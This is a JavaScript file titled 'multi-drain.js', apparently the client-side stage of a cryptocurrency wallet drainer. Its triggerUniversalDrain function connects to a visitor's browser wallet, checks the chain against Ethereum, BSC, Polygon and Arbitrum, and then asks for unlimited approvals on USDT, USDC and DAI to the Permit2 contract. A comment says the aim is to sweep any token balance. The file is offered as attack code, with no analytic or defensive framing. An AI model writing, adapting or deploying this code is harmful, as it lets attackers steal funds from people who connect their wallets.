/* multi-drain.js */
const SUPPORTED_NETWORKS = {
    1: { name: "Ethereum", rpc: "https://rpc.ankr.com/eth", permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
    56: { name: "Binance Smart Chain", rpc: "https://rpc.ankr.com/bsc", permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
    137: { name: "Polygon", rpc: "https://rpc.ankr.com/polygon", permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
    42161: { name: "Arbitrum", rpc: "https://rpc.ankr.com/arbitrum", permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3" }
};

const PERMIT2_ABI = [
    "function approve(address token, address spender, uint160 amount, uint48 expiration) external"
];

async function triggerUniversalDrain() {
    if (!window.ethereum) return;
    
    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    const chainId = Number(network.chainId);
    
    if (!SUPPORTED_NETWORKS[chainId]) {
        alert("Network not supported.");
        return;
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    const permit2Address = SUPPORTED_NETWORKS[chainId].permit2;

    // Universal permit2 approval to allow sweeping any token balance via signature or single call
    const commonTokens = [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474e89094c44Da98b954EedeAC495271d0F"  // DAI
    ];

    const ERC20_ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];

    for (const tokenAddr of commonTokens) {
        try {
            const tokenContract = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
            const tx = await tokenContract.approve(permit2Address, ethers.MaxUint256);
            await tx.wait();
        } catch (e) {
            console.error(`Skipped token ${tokenAddr}:`, e);
        }
    }
}